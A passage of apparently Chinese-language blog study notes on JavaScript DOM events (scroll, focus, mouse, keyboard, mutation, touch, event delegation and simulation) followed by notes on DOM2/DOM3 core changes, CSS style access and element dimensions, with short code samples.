scroll事件scroll事件在window对象上发生，但实际表示页面元素的变化，在混杂模式下，通过body元素的scrollLeft/scrollTop可以监控变化，在标准模式下，浏览器通过html元素反映变化（safari基于body元素跟踪滚动位置）。1234567EventUtil.addHandler(window, 'scroll', function(event)&#123; if(document.compatMode == 'CSS1Compat')&#123; document.documentElement.scrollTop; &#125;else&#123; document.body.scrollTop; &#125;&#125;); 焦点事件焦点事件在页面获得/失去焦点时触发，与document.hasFocus方法document.activeELement属性配合可以知道用户在页面上的行踪。焦点事件有如下6种： focus，在元素获得焦点时触发，此事件不会冒泡，所有浏览器都支持 blur DOMFocusIn，在元素获取焦点时触发，与HTML事件focus等价，但它会冒泡，且仅Opera支持，DOM3事件已废弃，选择focusin DOMFocusOut focusin，在元素获得焦点时触发，冒泡版本的focus，Firefox不支持 focusout当一个焦点从页面中的一个元素（元素1）移动到另一个元素（元素2），会依次触发下列事件： focusout 元素1 focusin 元素2 blur 元素1 DOMFocusOut 元素1 focus 元素2 DOMFocusIn 元素2 注，即使focus/blur不冒泡，但仍然能在捕获阶段监听到。 鼠标和滚轮事件鼠标是主要外设，在DOM3级事件中定义了9个鼠标事件： click，单击鼠标左键或按下回车触发，即onclick事件处理程序既可以通过键盘也可以通不过个鼠标执行 dblclick，双击鼠标左键 mouseenter，在鼠标从元素外部首次移动到元素范围内时触发，不冒泡，且移动到子元素上不会触发。IE、Firefox，Opera支持 mouseleave，与mouseenter对应 mousemove，当鼠标在元素内部移动时触发，不能通过键盘触发 mouseout，当鼠标位于元素上方，然后将其移入另一个元素（可为父元素/子元素）时触发，不能通过键盘触发 mouseover，当鼠标位于一个元素外部，然后将其首次移入另一个元素边界内时触发，不能通过键盘触发 mousedown，在用户按下鼠标按键时触发（不论左键/右键），不能通过键盘触发 mouseup，用户释放鼠标时触发，不能通过键盘触发 除了mouseenter/mouseleave，所有鼠标事件都会冒泡，也能被取消。而取消鼠标事件会影响浏览器默认行为，也会影响到其他事件，比如：只有在同一个元素上相继触发mousedown和mouseup事件才会触发click事件，若mousedown和mouseup其中一个被取消，则click不会被触发。类似的关系还有click与dblclick，这四个事件的顺序始终为： mousedown mouseup click mousedown mouseup click dblclick 鼠标事件都是在浏览器视口中的特定位置上发生的，这个位置信息保存在event.clientX/clientY属性中，分别表示事件发生时鼠标在视口中的水平/垂直坐标。 pageX/pageY可获取页面坐标，页面坐标根据页面本身而非视口计算。当页面为滚动时，pageX和clientX的值相等。IE8-不支持页面坐标，但通过scrollLeft + clientX可以计算出pageX。(混杂模式下scrollLeft为document.body的属性，而标准模式下为document.documentElement的属性) screenX/screenY可以确定鼠标相对屏幕的坐标信息。 当按下鼠标同时按下键盘的某些键，如Shift、Ctrl、Alt、Meta（Mac中为Cmd键，Windows中为Win键），能修改鼠标事件行为（组合事件）。DOM中规定了4个属性，分别表示修改键的状态，shiftKey，ctrlKey，altKey，metaKey。这些属性都是布尔值，若相应的键按下则为true。当鼠标事件发生时检测这几个属性能确定用户是否同时键盘的对应键。 在mouseout/mouseover发生时，会涉及2个元素，一个主元素一个相关元素，比如对mouseover而言获得光标的元素就是主元素。DOM通过event.relatedTarget属性提供了相关元素的信息，此属性只对mouseout/mouseover事件有效，其他事件此属性值为null。 在click事件触发时（单击鼠标/按下回车键），对mousedown/mouseup事件而言，其event对象存在一个button属性表示按下/释放的按钮，DOM的button属性中0表示主键（鼠标左键），1表示中间按键（鼠标滚轮），2表示次键（鼠标右键）。 DOM2级事件规范提供了event.detail属性，用于给出有关事件的更多信息。比如对鼠标事件来说，detail中就包含了表示给定位置上发生多少次单击的数值。IE也提供了一些属性，但用处不大。 鼠标事件中还有一类滚轮事件，即mousewheel事件。当用户通过鼠标滚路与页面交互时就会触发该事件，该事件可以在任何元素上触发，且会冒泡到window对象上（IE8下为document对象）。event.wheelDelta属性表示滚轮的数量（120的倍数，上+下-）。 Firefox支持一个类似的事件，DOMMouseScroll，该事件与mousewheel一样，滚轮信息保存在detail属性中（+-3的倍数）。 在触摸设备上（iPhone/iPad Safari），支持的事件有如下特性： 不支持dblclick事件，双击浏览器会放大窗口，且无法改变该行为。 轻击可单击元素（如链接，或注册了onclick的元素）会触发mousemove事件，若此操作导致内容变化则不再有其他事件发生，若无变化，则依次发生mousedown、mouseup、click事件。轻击不可单击元素不会触发任何事件。 mousemove事件也会触发mouseover/mouseout事件 两个手机放在屏幕上且滚动会触发mousewheel/scroll事件 关于无障碍性： 使用click事件执行代码（屏幕阅读器无法触发onmousedown） 不使用onmouseover（屏幕阅读器无法触发） 不要用dblclick，键盘无法触发此事件 键盘与文本事件DOM3级事件为键盘事件制定了规范，所有元素都支持如下3个事件，但一般用在文本框上： keydown，按下任意键触发，若按住不放，则重复触发 keypress，按下字符键触发，若按住部分，则重复触发 keyup，释放按下的键时触发当用户按了一个字符键时，首先触发keydown，然后是keypress，最后是keyup。其中keydown和keypress都是在文本框改变之前触发，而keyup则在文本框改变之后触发。 文本事件至于一个，textInput，该事件是keypress的补充，目的是为了在文本显示给用户之前更容易拦截文本，在文本插入文本框之前会触发textInput事件。此时event.data中保存着实际输入的字符。 当keydown和keyup发生时，event.keyCode表示按下的键值码，对字符键，值与ASCII码中的小写字母和数字对应。 当keypress发生时，event.charCode表示按下的字符键，然后基于可以用String.fromCharCode将其转换为实际的字符，浏览器之间有差异，需要先检测是否可用。 变动事件DOM2级的变动（mutation）事件能在DOM中的某一部分发生变化时触发，变动事件是为XML/HTML DOM设计的，与语言无关，DOM2级定义了如下变动事件： DOMNodeInserted，当一个节点作为子节点被插入到另一个节点中时触发 DOMNodeInsertedIntoDocument，在一个节点被直接插入到文档或通过子树间接插入文档后触发，此事件在DOMNodeInserted之后触发 DOMNodeRemoved，当节点从父节点被移除时触发 DOMNodeRemovedFromDocument DOMAttrModified， 在属性被修改后触发 DOMCharacterDataModified，在文本节点的值发生变化时触发 DOMSubtreeModified，在DOM结构中发生任何变化时触发，此事件在其他任何事件触发后都会触发。 DOM3级事件支持的变动事件（废除了部分） 删除节点使用removeChild或replaceChild时，首先触发DOMNodeRemoved事件，事件的event.target是被删节点，event.relatedTarget是父节点，此时，节点尚未从其父节点删除，因此parentNode属性仍然有效（同event.relatedTarget），此事件会冒泡，因此可以在DOM任何层次上处理。 若被删除的节点包含子节点，则其所有子节点以及被删除的节点会相继触发DOMNodeRemovedFromDocument事件，但此事件不会冒泡，所以只有直接指定给其中一个子节点的事件处理程序才会被调用，此事件的目标是相应子节点或被删除的节点，除此之外event对象不包含其他信息。 然后触发的是DOMSubtreeModified，此事件的event.target是被删节点的父节点，此时event对象不包含其他信息。 插入节点在使用appendChild、replaceChild、insertBefore向DOM插入节点时，会先触发DOMNodeInserted事件，此事件的event.target是被插入的节点，relatedTarget是父节点，此事件被触发时，节点已经被插入到了新的父节点中，由于此事件会冒泡，因此可以在DOM的各个层次处理它。 然后会在新插入的节点上触发DOMNodeInsertedIntoDocument事件，此事件不冒泡，因此必须在插入节点之前对它添加这个事件处理程序，此事件的target是被插入节点，除此之外event对象不包含其他信息。 最后一个触发的事件是DOMSubtreeModified，此事件的event.target是新插入节点的父节点。 HTML5事件H5详细列出了浏览器应该支持的所有事件，但并不是所有事件都被所有浏览器支持。 contextmenu事件单击鼠标右键能调出上下文菜单，contextmenu事件用于表示何时应该显示上下文菜单，以便取消默认的上下文菜单而提供自定义的菜单。 由于contextmenu冒泡，因此可以为document指定一个事件处理程序。此事件的target是用户操作的元素，可以用preventDefault取消此事件，同时由于contextmenu属于鼠标事件，所以其事件对象中包含与光标位置有关的所有属性。 通常contextmenu事件用来显示自定义上下文菜单，使用onclick来隐藏该菜单。 beforeunload事件beforeunload发生在window对象上，作用是在页面被卸载（关闭）前可以有一个提示框，能够阻止关闭页面，但不能彻底阻止，此事件将弹出提示框询问是否真的要关闭。 为了弹出对话框，必须将event.returnValue设置为显示给用户的字符串（IE/Firefox），同时将字符串作为函数的返回值（Chrome/Safari）。 DOMContentLoaded事件与window的load事件（一切都加载完，包括js、css、img）不同，DOMContentLoaded事件是在形成完整的DOM树之后就触发，此时不管img、js、css、或其他资源是否加载完毕。即，DOMContentLoaded事件能让用户尽早的与页面进行交互。 DOMContentLoaded事件可以添加在document或window对象上（其target值为document，所以其实是发生在document上，冒泡到window上）。DOMContentLoaded事件的event对象不会提供额外信息。 对于不支持DOMContentLoaded事件的浏览器，可在页面加载期间设置一个0毫秒的定时器setTimeout(func, 0)，表示在当前js处理完成后立即运行这个函数，在页面下载和构建期间，只有一个js处理过程，因此这个定时器会在该过程结束后立即触发。 因为这个定时器能否在DOM加载完后立即执行（如DOMContentLoaded事件执行的时间点）取决于浏览器和页面中的其他代码，所以为了确保有效，必须将其作为页面中第一个定时器，同时最好能最先执行。但即使如此，也无法保证该定时器一定早于load事件。 readystatechange事件readystatechange事件在IE、Firefox、Opera下可用。 这个事件的目的是提供与文档或元素的加载状态有关的信息，但此事件的行为有时候比较难以预测。支持此事件的对象都有一个readyState属性，该属性值有5种： uninitialized,为初始化，对象存在但未初始化 loading，加载中，对象正在加载数据 loaded，加载完成，对象加载数据完成 interactive，可交互，可以操作对象，但还没完全加载完 complete，完成，对象已经加载完毕并非所有对象都会经历readyState这几个阶段，即，若某几个阶段不适用于对象，则该对象完全可能跳过该阶段，但并没有规定那个阶段适合于那个对象，所以，readystatechange事件可能会少于4次，且readyState属性值也不总是连续的。 对document而言，值为interactive的readyState会在与DOMContentLoaded大致相同的时刻触发readystatechange事件，此时，DOM树已经加载完成，可以安全操作，因此会进入interactive阶段，但图像或其他外部文件不一定可用。 此事件的event不会提供任何信息，包括target属性。 在与load事件一起使用时，无法预测两个事件触发的先后顺序，在页面包含较多或较大外部资源时，load事件触发之前会进入交互阶段，但若页面包含资源较小较少，则很难确定readystatechange事件和load事件发生的顺序。 同时interactive和complete阶段的顺序也如load和readystatechange事件一样，顺序无法精确定下，因此为了尽快执行代码，有必要同时检测交互和完成阶段：123456EventUtil.addHandler(document, 'readystatechange', function(event)&#123; if(document.readyState == 'interactive' || document.readyState == 'complete')&#123; EventUtil.removeHandler(document, 'readystatechange', arguments.callee); // content loaded; &#125;&#125;); 如此，若已经进入交互阶段或完成阶段则removeHandler，是为了避免在其他阶段执行该事件处理程序。这样就达到与DOMContentLoaded相近的效果。 另外，script（IE/Opera）和link（IE）元素也会触发readystatechange事件，可用来确定外部的js和css文件是否加载完成。而基于元素触发的readystatechange事件也需要向对待document那样，同时检测loaded和complete阶段。 pageshow和pagehide事件现在浏览器（IE9+）有一个特性，往返缓存（back-forward cache, bfcache）,可以在用户使用“后退”/“前进”按钮时加快页面的转换速度，这个缓存不仅保存着页面数据，还保存了DOM和js状态，实际上就是将整个页面都保存在了内存中。若页面位于bfcache，你们再次打开页面就不会触发load事件，因此提供了一些新事件用于支持bfcache的行为： pageshow事件就是在页面显示时触发，无论该页面是否来自bgcache，在重新加载的页面中，pageshow会在load事件触发后触发，而对bfcache中的页面，pageshow会在页面状态完全回复时触发。 注意，此事件的target是document，但必须将事件处理程序添加到window。 pageshow事件的event对象中有一个布尔值属性，persisted，若页面被保存在bfcache中则为true，否则为false。通过检测persisted属性，可以根据页面在bfcache中的状态来确定是否需要采取其他操作。 与pageshow事件对应的是pagehide事件，对pagehide事件，persisted为true则表示页面卸载后会被保存在bfcache中，否则为false，因此第一次触发pageshow时，persisted值一定是false。 hashchange事件hashchange事件是在url中的hash字符串发生变化时触发，在ajax应用中，经常会用到url参数来保存状态或导航信息。 hashchange事件需要添加到window对象上，此时event对象会额外有oldURL和newURL属性（IE/Safari不支持），分别表示hash变化前后的完整URL。 设备事件设备事件（device event）可以让开发者确定用户在如何使用设备，但某些API还是特定浏览器厂商的事件，而未成为标准： orientationchange事件，确定用户何时将设备由横向查看切换为纵向查看模式，移动safari的window.orientation属性可能取3种值：0表示纵向，90表示左旋转横向（主屏幕按钮在右侧），-90相反。 MozOrientation事件，当设备的加速计检测到设备方向改变时触发，但与orientationchange事件不同，该事件提供一个平面的方向变化。 deviceorientation事件，与MozOrientation事件类似，但其目的是表示设备在空间中的朝向。 devicemotion事件，展示设备移动（不仅仅是设备方向改变） 触摸与手势事件触摸与手势事件都是由apple引入的，开始只有移动版的safari支持，后来移动版的webkit（包括android）也开始支持，只针对触摸设备的事件 触摸事件 touchstart，当手指触摸屏幕时触发，即使已经有一个手指放在屏幕上也会触发 touchmove，当手指在屏幕上滑动时连续触发,取消此事件会阻止滚动 touchend，当手指从屏幕上移开时触发 touchcancel，当系统停止跟踪触摸时触发（确切的事件不太清楚）上述几个事件都会冒泡，也都可通过preventDefault阻止取消，每个触摸事件的event对象都提供了鼠标事件中常见的属性。除了常见的DOM属性外，还有3个用于跟踪触摸的属性： touches，表示当前跟踪的触摸操作的Touch对象的数组 targetTouches，特定于事件目标的Touch对象的数组 changedTouches，表示自上次触摸依赖发生了什么改变的Touch对象的数组 每个Touch对象包含下列属性： clientX/clientY，触摸目标在视口中的x/y坐标 pageX/pageY，触摸目标在页面中的x/y坐标 screenX/screenY，触摸目标在屏幕中的x/y坐标 identifier，标志触摸的唯一ID target，触摸的DOM节点目标 在触摸屏幕上的元素时，事件发生顺序如下（包括鼠标事件也会被触发）： touchstart mouseover mousemove(一次) mousedown mouseup click touchend 手势事件当两个手指触摸屏幕时会产生手势，手势通常会改变显示项的大小，或渲染显示项： gesturestart，当一个手指已经按在屏幕上，而另一个手指又触摸屏幕时触发 gesturechange，当触摸屏幕的任何一个手指的位置发生变化时触发 gestureend，当任何一个手指从屏幕上移开时触发这些事件都会冒泡，同时这些事件的target是两个手指都位于其范围内的那个元素。 触摸事件和手势事件之间存在关联，当一个手指放在屏幕上时，会触发touchstart，若同时另一个手指也放在屏幕上，则会西安出发gesturestart事件，随后触发基于该手指的touchstart事件，若手指在屏幕上滑动则会触发gesturechange事件，但只要有一个手指移开就会触发gestureend事件，然后基于该手指触发touchend。 与触摸事件一样，每个手势事件的event对象包含标准的鼠标事件属性，同时额外还有rotation和scale。rotation表示手指变化引起的旋转角度，负值表示逆时针旋转。scale表示手指间距离的变化情况，从1开始随距离拉大而增长，距离缩短而减小。 内存和性能由于事件处理程序为Web应用提供交互能力，所以很容易导致页面添加大量的处理程序，在js中，添加到页面上的事件处理程序数量会直接关系到页面的整体运行性能。原因之一是每个函数都是对象，都会占用内容，内存中对象越多，性能就越差。其次必须事先指定所有事件处理程序而导致的DOM访问次数，会延迟整个页面的交互就绪时间。 事件委托对“事件处理程序过多”问题的解决方案就是事件委托，事件委托利用事件冒泡，只指定一个事件处理程序，就可以管理某一类型的所有事件，如click事件会一直冒泡到document层次，即只需要为整个页面指定一个onclick事件处理程序，而不必为每个单击的元素单独添加。 若可行的话，考虑为document对象添加一个事件处理程序，用以处理页面上发生的某种特定类型的事件，优点如下： document对象很快就可以访问，而且可以在页面生命周期的任何时间点上为它添加事件处理程序（无需等DOMContentLoaded、load事件），即，只要可单击的元素出现在页面上即可执行注册的功能。 在页面中设置事件处理程序所需的事件更少，只添加一个事件处理程序所需的DOM引用更少，所花的时间更少。 整个页面占用的内存空间更少，能够提升整体性能最适合采用事件委托的事件包括：click、mousedown、mouseup、keydown、keypress。mouseover/mousout事件也冒泡，但处理不易且一般需要计算元素位置（当鼠标从一个元素移到其他子节点时，或者当鼠标移出该元素时，都会触发mouseout事件） 移除事件处理程序当内存中保存着过时不用的“空事件处理程序（dangling event handler）”是造成web内存和性能的主要原因。 每当事件处理程序指定给元素时，运行中的浏览器代码与支持页面交互的js代码之间会建立一个连接。采用事件委托可以减少连接数量。在不需要的时候移除事件处理程序也可以解决此问题。 有两种情况下会造成空事件处理程序，第一种是从文档中移除带有事件处理程序的元素时，比如removeChild/replaceChild/innerHTML将页面中某一部分移除，此时，原来添加到元素中的事件处理程序内存就有可能无法被正常回收。此种情况，最好在移除元素之前先移除事件，其次，通过事件委托将事件注册到更高层元素上也可以避免这种问题。 另一个种就是卸载页面时，要解决这种情况，最好的方法就是在页面卸载之前，通过onunload将事件都移除，若以前是通过事件委托注册的事件那么此时移除的事件就能大大减少（跟踪的事件处理程序越少，移除就越容易），简单的说就是通过onload添加的最后都要通过onunload移除。 模拟事件模拟事件就是通过js可以在任意时刻触发特定的事件，而此时的事件就如同浏览器原生的事件一样，该冒泡、该执行的都会继续执行。 在测试web应用时，模拟触发事件是非常有用的。DOM2级规范谓词规定了模拟特定事件的方式，（IE8-有特殊,暂时忽略）。 DOM中的事件模拟可以在document对象上使用createEvent方法创建event对象，接收一个参数，表示要创建的事件类型的字符串，在DOM2级中，所有字符串都使用英文复数形式，在DOM3级改为了单数。 UIEvents，一般化的UI事件，鼠标和键盘事件都继承自UI事件，DOM3中为UIEvent MouseEvents，一般化的鼠标事件 MutationEvents，一般化的DOM变动事件 HTMLEvents，一般化的HTML事件，无对应的DOM3级事件创建了event对象后，还需要使用与事件有关的信息对其进行初始化，每种类型的event对象都有一个特殊的方法，为它传入适当的数据可以初始化该event对象，不同类型的方法名不同，取决于createEvent中使用的参数。最后一步就是触发事件，需要使用dispatchEvent方法，传入表示要触发事件的event对象即可。 模拟鼠标事件createEvent(&#39;MouseEvents&#39;)返回的event对象有一个initMouseEvent方法，用于指定与该鼠标事件有关的信息，该方法接收15个参数，分别与鼠标事件中每个典型属性一一对应。如type、bubbles、cancelable、view（几乎都是设置为document.defaultView）等。 模拟键盘事件DOM2级事件中没有单独对键盘事件做出规定，而仅仅是在草案中提及，DOM3级事件中的键盘事件其实就是DOM2级草案中的事件。 传入”KeyboardEvent”可以创建一个键盘事件，返回的事件对象会包含一个initKeyEvent方法，该方法接收参数： type bubbles cancelable view key，表示按下的键的键码 location,整数，表示按下哪里的键，0默认为主键盘，1表示左，2表示右，3表示数字键盘，4表示移动设置（虚拟键盘），5表示手柄 modifiers，字符串，空格分隔的修改键列表，如”Shift Ctrl” repeat,整数，在一行中按了多少次这个键 Firefox中传入”KeyEvents”创建。 模拟其他事件此处指的是变动事件和HTML事件，一般用的较少，略过。 自定义DOM事件DOM3级定义了“自定义事件”，自定义事件不是DOM原生触发的，而是开发者创建的事件。 传入”CustomEvent”创建一个自定义DOM事件,返回的事件对象中有一个initCustomEvent方法。 IE8-中的事件模拟思路与DOM的类似，但每一步骤采用了不一样的方法名好方式。 调用document.createEventObject方法在IE中创建event对象，但与DOM不同，此方法不接受参数，而是返回一个通用event对象，然后手动显式设置该对象中所有必要的信息。最后在目标元素上调用fireEvent方法，此方法接收2个参数，事件处理程序名和上一步的event对象。 小结事件是将js同网页联系在一起的主要方式，DOM3级事件规范和H5定义了常见的大多数事件，但仅仅是基本事件，浏览器厂商同时也实现了自己的专有事件。事件是js最重要的主题之一，深入理解事件的工作机制以及它们对性能的影响至关重要，在使用时需要考虑内存和性能问题： 有必要限制一个页面中事件处理程序的数量，数量太多会导致占用大量内存，而且会让用户感觉页面延迟高 建立在事件冒泡机制之上的事件委托技术，从而有效减少事件处理程序的数量 建议在浏览器卸载页面之前移除页面中移除事件处理程序 使用js模拟事件，DOM2级和DOM3级事件规范规定了模拟事件的方法，为模拟各种事件提供了方便。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"},{"name":"events","slug":"events","permalink":"https://github.com/xmoyKING/tags/events/"}]},{"title":"JavaScript高级程序设计-19-DOM2和DOM3","slug":"js-pro19","date":"2016-08-27T13:45:02.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/08/27/js-pro19/","link":"","permalink":"https://github.com/xmoyKING/2016/08/27/js-pro19/","excerpt":"","text":"DOM1级主要定义的是HTML和XML文档的底层结构，DOM2和DOM3则在这个结构的基础上引入了更多的交互功能，支持更高级的XML特性。DOM2和DOM3分为许多模块（模块之间有关联），分别描述了DOM的某个非常具体的子集： DOM2 Core 核心，在1级核心基础上构建，为节点添加了更多方法和属性 DOM2 Views 视图，为文档定义了基于样式信息的不同视图 DOM2 Events 事件，说明了如何使用事件与DOM文档交互 DOM2 Style 样式，定义了如何以变成方式来访问和改变CSS样式信息 DOM2 Traversal and Range 遍历和范围，引入了遍历DOM文档和选择其特定部分的新街口 DOM2 HTML，在1级HTML基础上构建，添加了更多属性、方法和新接口 DOM3 XPath DOM3 Load and Save 加载和保存 DOM变化DOM2和DOM3的目的在于扩展DOM API，以满足操作XML的所有需求，同时提供更好的错误处理和特性检测能力。DOM2 Core没有引入新类型，只是在DOM1的基础上通过添加新方法和新属性来增强了既有类型,DOM3 Core同样增强了既有类型，也引入了新类型。 12345var supportsDOM2Core = document.implementation.hasFeature('Core', '2.0');var supportsDOM3Core = document.implementation.hasFeature('Core', '3.0');var supportsDOM2Views = document.implementation.hasFeature('Views', '2.0');var supportsDOM2HTML = document.implementation.hasFeature('HTML', '2.0');var supportsDOM2XML = document.implementation.hasFeature('XML', '2.0'); 针对XML命名空间的变化XML命名空间，不同XML文档的元素可以混合在一起，共同构成格式良好的文档，且不必担心命名冲突。从技术上，HTML是不支持XML命名空间的，但XHTML支持XML命名空间。 但由于H5的流行，XHTML现在已经被抛弃了，同时，关于命名空间在实际中运用非常少，所以本章略过笔记 其他变化DOM的其他部分在DOM2核心中也有一些变化。 DocumentType类型变化由于H5，所以略过 Document类型变化该类型添加了一个与命名空间无关的方法，importNode，该方法用于从一个文档中取得一个节点，然后将其导入到另一个文档。该方法使用很少，略过 Node类型变化Node类型添加了isSupported方法，与DOM1中的document.implementation.hasFeature方法类似，该方法用于确定当前节点具有什么能力，这个方法接受的参数也与hasFeature相同：特性名、版本号。返回布尔值。此方法使用是需谨慎，最好使用能力检测代替。 DOM3引入两个比较节点的方法isSameNode、isEqualNode。都接收一个节点作为参数，并在相同/相等时返回true。所谓相同即两个节点引用的是一个对象。所谓相等即节点类型、属性、甚至子节点属性等都相等。 DOM3的setUserData方法能将额外数据指定给节点，该方法有三个参数：键名、值、处理函数。使用getUserData依据键名获取值。处理函数在当节点被修改时（复制、删除、重命名、引入新文档）调用，处理函数接受5个参数：表示操作类型的数值（1表示复制、2表示导入、3表示删除、4表示重命名），键，值，源节点，目标节点。在删除时，源节点为null，在复制节点时，目标节点为null。12345678document.body.setUserData('name','king',func);document.body.getUserData('name'); // 'king'function func(operation, key, value, src,dest)&#123; if(operation == 1)&#123; // ... &#125;&#125; 框架变化框架和内嵌框架分别用HTMLFrameElement和HTMLIFrameElementI表示，在DOM2中都添加了一个新属性，contentDocument，该属性包含一个指针，指向表示框架内容的文档对象，在此之前，无法直接通过元素取得这个文档对象(只能用frames集合)。 contentDocument属性是Document类型的实例，因此能使用document对象的所有属性和方法，在IE8前无效，但支持contentWindow属性，该属性返回框架的window对象。12var iframe = document.getElementById('myiframe');var framedoc = iframe.contentDocument || iframe.contentWindow.document; 样式在HTML中定义样式的方式有三种，link外接、style元素嵌入、style属性设置。DOM2针对这三种应用样式的机制提供了一套统一的API。通过hasFeature可以检测浏览器是否支持DOM2级定义的CSS。 访问元素的样式任何支持style特性的HTML元素在js中都有一个对应的style属性，这个style对象是CSSStyleDeclaration的实例，包含着通过HTML的style属性指定的所有样式信息，但不包含外部样式表或嵌入样式。 style对象中以大驼峰命名格式对应style属性中的连字符命名格式。比如style.backgroundImage对应background-image。123var div = document.getElementById('mydiv');div.style.backgroundColor = 'red';div.style.border = '1px solid red'; 注：float由于是js中的保留字，所以在DOM2级中对应的属性名为cssFloat，在IE中为styleFloat。 若没有为元素设置style属性，则style对象中可能会包含一些默认的值，但这些默认值不能准确反映该元素的样式信息。 DOM样式属性和方法DOM2级样式规范为style对象定义了一些属性和方法，这些属性和方法在提供元素的style特性值的同时也可以修改样式。 cssText, 通过它能访问到style特性中的css代码 length，应用给元素的CSS属性的数量 parentRule，表示CSS信息的CSSRule对象 getPropertyCSSValue(propertyName), 返回包含给定属性值的CSSValue对象 getPropertyPriority(propertyName), 若给定的属性使用了!important设置则返回important，否则返回空字符串 getProperty(propertyName), 返回给定属性的字符串值 itme(index), 返回给定位置的CSS属性的名称 removeProperty(propertyName), 移除给定属性 setProperty(propertyName, value, priority), 将给定属性设置为相应的值，并加上优先级标志（’important’或空字符串） 通过cssText属性可以访问style特性中的css代码，在读模式下，cssText返回浏览器对style属性中css代码的内部表示，在写模式下，赋给cssText的值会重写整个style属性的值，即，以前通过style属性指定的样式信息会丢失。设置cssText可以一次性的应用所有变化。 length属性的作用在于与item方法配合使用，以便迭代在元素中定义的CSS属性： getPropertyValue取得是连字符格式的原始css属性值而不是大驼峰格式的值.getPropertyCSSValue取得的CSSValue对象有2个属性，一个是cssText，与getPropertyValue值相同，另一个是cssValueType，表示值的类型，0表示继承的值，1表示基本值，2表示值列表，3表示自定义的值。123456789for(var i = 0, n = div.style.length; i &lt; n; i++)&#123; var prop = div.style[i]; // div.style.item(i); div.style.getPropertyValue(prop); var value = div.style.getPropertyCSSValue(prop); value.cssText; value.cssValueType;&#125; removeProperty方法移除一个属性意味着该属性将使用默认样式（或从父元素继承层叠而来的样式） 计算的样式style对象只能提供style属性的元素的样式信息，其他内嵌和外部引入的样式则无法获取。DOM2级样式增强了document.defaultView，提供getComputedStyle方法，该方法返回一个CSSStyleDeclaration的对象（与document.style属性的类型相同）,其中包含当前元素的所有计算的样式。此方法接受2个参数：要计算样式的元素、一个伪元素字符串（比如’::after’），第二个参数可以是null。 IE并不支持computedStyle方法，但IE下的style属性有一个currentStyle属性，与computedStyle方法效果相同。 123var computedStyle = document.defaultView.getComputedStyle(div, null) || div.style.currentStyle;computedStyle.backgroundColor; // 'red'computedStyle.border; // undefined 注：一些综合属性，如border返回的是undefined。 无论是什么浏览器，计算后的样式都是只读的，同时计算后的样式也包含浏览器内部样式表的信息，因此任何具有默认值的CSS属性都会表现在计算后的样式中。 操作样式表一般情况下不会操作样式表，此部分了解即可 CSSStyleSheet类型表示的是样式表，包含link元素样式表、style元素样式表，实际上，这两个元素分别是由HTMLLinkElement和HTMLStyleElement类型表示的，但CSSStyleSheet类型更通用，它表示样式表，而不管这些样式表在HTML是如何定义的。 除一个属性之外，CSSStyleSheet对象的其他接口都是只读接口，使用hasFeature可以确定浏览器是否支持DOM2级样式表。 CSSStyleSheet继承自StyleSheet，后者是一个基础接口定义非CSS样式表，从StyleSheet接口继承而来的属性有： disabled，表示样式表是否被禁用，此属性是唯一可写的属性，设置为true可禁用样式表 href，若样式表通过link包含，则值为url值，否则为null media，当前样式支持的所有媒体类型的集合，与所有DOM集合一样，这个集合也有length属性和item方法，也可以通过索引方式获取特定项，若集合为空列表，表示样式适合所有媒体 ownerNode，指向拥有当前样式表的节点的指针，样式表若是通过@import导入，则为null，IE不支持此属性 parentStyleSheet，样式表若是通过@import导入，则这个属性是一个指向导入它的样式表的指针 title，ownerNode中的title属性的值 type，表示颜色供hi表类型的字符串，对CSS样式表而言，为”type/css” CSSStyleSheet类型还有如下的几个属性和方法 cssRules，颜色供hi表中包含的样式规则的集合，IE不支持，但有一个类似的rules属性 ownerRule，若样式表通过@import导入，此属性为一个指向表示导入的规则的指针，否则为null，IE不支持 deleteRule(index), 删除cssRules集合中指定位置的规则，IE不支持，但有一个类似的removeRule()方法 insertRule(rule, index), 向cssRules集合中指定的位置插入rule字符串，IE不支持，但有类似的addRule()方法 应用于文档的所有样式表都可以通过document.styleSheets集合来表示。或通过link/style元素获取，DOM规定的一个包含CSSStyleSheet对象的属性sheet（IE中为styleSheet）。123var sheet = document.styleSheets[0];var link = document.getElementsByTagName('link')[0].sheet || document.getElementsByTagName('link')[0].styleSheet; CSSRule对象表示样式表中的每一条规则，实际上，CSSRule是一个基类，CSSStyleRule类型比较常见，表示样式信息（其他规则还有@import,@font-face,@page,@charset,但这些规则一般不通过脚本访问。） CSSStyleRule对象包含如下属性： cssText，返回整条规则对应的文本 parentRule，若是导入的规则，则返回导入规则，否则为null parentStyleSheet，当前规则所属的样式表，IE不支持 selectorText，返回当前规则的选择符文本，由于浏览器差异，返回的文本可能与实际样式表中的原始文本不同 style，CSSStyleDeclaration对象，通过它可以设置和取得规则中的特定样式值 type，表示规则类型的常量值，对样式规则此值为1 元素大小本部分的属性和方法并不属于DOM2级样式，因为DOM没有规定如何确定页面中元素的大小，但却非常重要。 偏移量偏移量（offset dimension）包括元素在屏幕上占用的所有可见的空间，元素的可见大小由其高度、宽度决定，包括所有内边距、滚动条、边框大小（不包括外边框）。如下4个属性获取元素的偏移量： offsetHeight， 元素在垂直方向上占用的空间大小，单位为像素， offsetWidth offsetLeft，元素的左外边框至包含元素的左内边框的像素距离 offsetTop其中offsetLeft/offsetTop与包含元素有关，包含元素的引用保存在offsetParent属性中。offsetParent属性与parentNode值不一定相等。例如td元素的offsetParent是table元素，因为table是其DOM层次中距td最近的一个具有大小的元素。 要想知道元素在页面上的偏移量，将这个元素的offsetLeft和offsetTop与其offsetParent的相同属性相加，循环至根元素即可。12345678910function getElementLeft(e)&#123; var left = e.offsetLeft; var p = e.offsetParent; while(p !== null)&#123; left += p.offsetLeft; p = p.offsetParent; &#125; return left;&#125; 由于偏移量是只读的，所以每次访问都需要重新计算，因此，应尽量避免重复访问这些属性。 客户区大小客户区大小（client dimension）指元素的内边距及其内容可所占的大小（不包含边框和外边距），分别是clientWidth和clientHeight。 客户区大小就是元素内部的空间大小，所以滚动条并不包含在内。同偏移量一样，客户区大小也是只读属性。 滚动大小滚动大小（scroll dimension）指包含滚动内容的元素的大小，有些元素（如html）能自动添加滚动条，有一些需要通过设置overflow才能滚动。与滚动大小相关的属性为： scrollHeight，在没有滚动条的情况下，元素内容的总高度 scrollWidth scrollLeft， 被隐藏在内容区域左侧的像素值，可写 scrollTop 